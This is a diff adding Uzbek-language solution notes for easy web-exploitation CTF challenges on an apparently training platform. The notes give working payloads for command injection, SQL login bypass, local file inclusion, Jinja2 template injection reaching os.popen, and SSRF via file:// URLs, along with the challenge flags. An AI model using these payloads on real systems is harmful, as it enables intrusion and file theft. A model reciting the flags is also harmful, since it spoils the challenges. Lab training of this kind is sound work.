@@ -1,0 +1,224 @@
+4)
+Easy
+Web Exploitation
+Yechilgan
+simple sqli
+13 yan 2026
+Ball
++100
+
+127.0.0.1 | ls -la /							injection hujumi uchun ping oynasidan beriladigan va ichkaridagi papkalarni korsatadigan buyruq  server ip yoziladi
+
+; cat /flag.txt                       					sever ichidagi flag.txt faylini ichini ochib beradigan buyruq
+
+(' OR '1'='1' -- )							serverga admin sifatida kirish (-- dan keyin bitta bosh joy bolishi kerak)
+
+HackNow{sql_injection_mastery_5}            
+
+
+
+5)
+Easy
+Web Exploitation
+Yechilgan
+simple lfi
+13 yan 2026
+Ball+100
+
+HackNow{lfi_can_reveal_secrets_4} 
+https://a4db736084.lab.hacknow.uz/?file=secret_flag.txt   kalit kirish eshigi bolib berdi
+
+
+6)
+Easy
+Web Exploitation
+Injection?
+10 mar 2026
+Ball
++100
+
+HackNow{sst1_t3mpl4t3_1nj3ct10n_pwn}
+
+{{ self._TemplateReference__context.namespace.__init__.__globals__.__builtins__.open('/flag.txt').read() }}  
+ 			
+Buni quyidagi bosqichma-bosqich "xakerlik zanjiri" deb tasavvur qiling:
+
+{{ ... }} (Qopqonni ochish):
+
+Server bu qavslarni koʻrganda: "Aha, bu shunchaki matn emas, bu yerda nimadir hisob-kitob qilinishi kerak!" deb oʻylaydi (xuddi 7*7ni 49 qilib hisoblagani kabi).
+
+self._TemplateReference...__globals__ (Tizim ichiga kirib olish):
+
+Dasturchi sizga faqat tor bir xona (saytning ustki qismi)ni koʻrsatib qoʻygan edi. Lekin bu uzun buyruq orqali siz Python shablonining "ichki xotirasi" (kattalar xonasi)ga ruxsat olib oʻtdingiz.
+
+__import__('os') (Operatsion tizimni qo'lga olish):
+
+Python xotirasiga kirib olgandan soʻng, siz serverning Linux operatsion tizimi bilan muloqot qiluvchi os (Operating System) modulini avtomatik chaqirib oldingiz. Bu bilan siz sayt chegarasidan chiqib, server kompyuterining oʻziga buyruq berish huquqini qoʻlga kiritdingiz.
+
+popen('cat /flag*').read() (Buyruqni bajarish va bayroqni o'g'irlash):
+
+Oxirida Linux’ga "Ildiz papkadagi nomi 'flag' deb boshlanadigan faylni och va ichini oʻqib ber!" degan konsol buyrugʻini yubordingiz. Server bu buyruqni soʻzsiz bajardi va HackNow{...} matnini sizga qaytarib berdi.
+
+
+7)
+Easy
+Web Exploitation
+Unitilgan Ish
+14 yan 2026
+Ball
++100
+
+https://4a39dd2c62.lab.hacknow.uz/profile?user_id=2
+HackNow{USER_ACCESS_GRANTED}
+
+
+
+8)
+Easy
+Web Exploitation
+Simple Command
+8 mar 2026
+Ball
++100
+
+HackNow{c0mmand_1nj3ct10n_1s_s0_d4ng3r0us}
+
+127.0.0.1 | ls -la /							injection hujumi uchun ping oynasidan beriladigan va ichkaridagi papkalarni korsatadigan buyruq  server ip yoziladi
+
+; cat /flag.txt                       					sever ichidagi flag.txt faylini ichini ochib beradigan buyruq
+
+
+
+
+
+
+9)
+Easy
+Web Exploitation
+API Fuzzer
+25 apr 2026
+Ball
++50
+
+
+
+HN{JSON}	HN{JWT}		HN{BOLA}	HN{403}		HN{ffuf}
+
+
+
+
+
+10)
+Easy
+Web Exploitation
+Yechilgan
+Tanish
+7 mar 2026
+Ball
++100
+
+1. Joriy papkadagi (current directory) barcha fayllarni ko'rish
+Sayt ishlayotgan papka ichida qanday fayllar borligini ro'yxat shaklida chiqaradi:
+
+Plaintext
+{{ self._TemplateReference__context.namespace.__init__.__globals__.__builtins__.__import__('os').popen('ls -la').read() }}
+
+Fayl ichidagi flagni oʻqish uchun input maydoniga quyidagi payloadni kiriting:
+
+Plaintext
+{{ self._TemplateReference__context.namespace.__init__.__globals__.__builtins__.open('flag.txt').read() }}
+
+HackNow{0kii0jlda77pc0hl59}
+
+
+11)
+Easy
+Web Exploitation
+Yechilgan
+HackNow search
+7 mar 2026
+Ball
++100
+1. Joriy papkadagi (current directory) barcha fayllarni ko'rish
+Sayt ishlayotgan papka ichida qanday fayllar borligini ro'yxat shaklida chiqaradi:
+
+Plaintext
+{{ self._TemplateReference__context.namespace.__init__.__globals__.__builtins__.__import__('os').popen('ls -la').read() }}
+
+Fayl ichidagi flagni oʻqish uchun input maydoniga quyidagi payloadni kiriting:
+
+Plaintext
+{{ self._TemplateReference__context.namespace.__init__.__globals__.__builtins__.open('flag.txt').read() }}
+
+HackNow{SSTI_Found!}
+
+
+
+
+12)
+Easy
+Web Exploitation
+Internal Ping
+10 mar 2026
+Ball
++100
+
+HackNow{ssrf_c4n_r34d_l0c4l_f1l3s}
+
+file://localhost/flag.txt  			Chrome brauzerida saytning kiritish maydoniga (input box) quyidagi manzilni kiriting va yuboring:
+file:///flag.txt		
+
+
+13)
+Easy
+Web Exploitation
+BasicVuln
+5 mar 2026
+Ball
++100
+
+
+
+
+
+
+14)
+Easy
+Web Exploitation
+simple IDOR
+10 mar 2026
+Ball
++100
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
